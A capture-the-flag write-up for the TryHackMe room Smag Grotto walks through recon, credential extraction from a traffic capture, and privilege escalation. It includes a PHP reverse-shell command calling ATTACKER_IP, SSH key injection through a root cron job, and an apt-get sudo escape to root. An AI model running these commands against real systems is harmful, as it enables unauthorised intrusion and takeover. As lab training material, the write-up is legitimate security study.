# Smag Grotto — TryHackMe Write-up

## 1. Reconnaissance

I started with an Nmap scan to identify open ports and running services.

```bash
nmap -sC -sV TARGET_IP
```

The scan revealed two open ports:

- `22` — SSH
- `80` — HTTP

I opened the website on port 80, but the main page did not provide any useful information. I decided to enumerate directories using Gobuster.

## 2. Directory Enumeration

I used Gobuster to discover hidden directories on the web server.

```bash
gobuster dir -u http://TARGET_IP -w WORDLIST
```

The scan revealed the `/mail` directory. Inside, I found a network traffic capture that could be analyzed using Wireshark.

## 3. Analyzing the Wireshark Capture

I opened the capture file in Wireshark and inspected the HTTP traffic.

Among the captured packets, I found requests related to an administrative login. The traffic contained credentials and information about the admin panel endpoint.

I extracted the credentials from the HTTP packets and used them to log in to the administrative panel.

This was the first important clue: a publicly accessible traffic capture can expose sensitive information transmitted over HTTP.

## 4. Getting a Reverse Shell

After logging in to the admin panel, I generated a PHP reverse-shell payload.

```bash
php -r '$sock=fsockopen("ATTACKER_IP",4444);shell_exec("sh <&3 >&3 2>&3");'
```

I replaced `ATTACKER_IP` with my Kali machine's IP address and used port `4444`.

I started a listener on my machine and triggered the payload through the web application. The target connected back to my listener, giving me a shell as `www-data`.

## 5. Improving the Shell

I checked the current user and available privileges.

```bash
whoami
id
sudo -l
```

The shell did not have a proper TTY, which made interactive commands inconvenient.

I upgraded the shell using Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

After that, I continued enumerating the system for possible privilege escalation paths.

## 6. Finding the Cron Job

I inspected the system crontab:

```bash
cat /etc/crontab
```

I found an interesting scheduled task:

```bash
* * * * * root /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
```

The task runs every minute as `root`. It copies the contents of a backup file into Jake's `authorized_keys` file.

I checked the permissions of the backup file and its directory:

```bash
ls -la /opt/.backups/
ls -l /opt/.backups/jake_id_rsa.pub.backup
```

The backup file was writable by `www-data`.

This meant I could replace its contents with my own SSH public key and wait for the cron job to copy it into Jake's authorized keys.

## 7. Escalating from www-data to jake

On my Kali machine, I generated a new SSH key pair:

```bash
ssh-keygen -t rsa -f jake_key -N ""
```

This created two files:

- `jake_key` — the private key
- `jake_key.pub` — the public key

I kept the private key on my Kali machine and copied the public key into the writable backup file on the target:

```bash
printf '%s\n' 'PUBLIC_KEY_CONTENT' > /opt/.backups/jake_id_rsa.pub.backup
```

After the cron job ran, my public key was copied into `/home/jake/.ssh/authorized_keys`.

I then connected over SSH using my private key:

```bash
chmod 600 jake_key
ssh -i ./jake_key jake@TARGET_IP
```

After successfully logging in as `jake`, I read the user flag:

```bash
cat ~/user.txt
```

The important lesson here is that the public key itself is not secret. The vulnerability was the combination of a privileged cron job and a backup file that I could modify.

## 8. Escalating from jake to root

As `jake`, I checked which commands could be run through sudo:

```bash
sudo -l
```

The output showed that `jake` could run `/usr/bin/apt-get` as any user without entering a password:

```text
(ALL : ALL) NOPASSWD: /usr/bin/apt-get
```

I checked GTFOBins for a way to abuse this permission. I found that `apt-get` could be used to execute a command through the `APT::Update::Pre-Invoke` option.

I ran:

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

This spawned a shell with root privileges.

I verified the result:

```bash
whoami
id
```

After confirming that I had root access, I read the root flag:

```bash
cat /root/root.txt
```

## Attack Path Summary

```text
Nmap
  → Gobuster
  → /mail
  → Wireshark traffic capture
  → Credentials exposed in HTTP traffic
  → Admin panel login
  → PHP reverse shell
  → www-data
  → Writable backup file used by a root cron job
  → SSH public key injection
  → jake
  → sudo -l
  → Misconfigured apt-get permissions
  → root
```

## What I Learned

- Enumerating directories can reveal files that are not linked from the main website.
- HTTP traffic captures may expose credentials and login endpoints.
- A reverse shell may need a PTY upgrade for convenient interaction.
- Cron jobs should be checked for privileged commands that read or copy user-writable files.
- SSH public-key authentication can be abused when an attacker can modify a user's `authorized_keys` through a privileged process.
- `sudo -l` is an important privilege-escalation check.
- Programs allowed through sudo without a password may provide a path to root if their functionality can be abused.
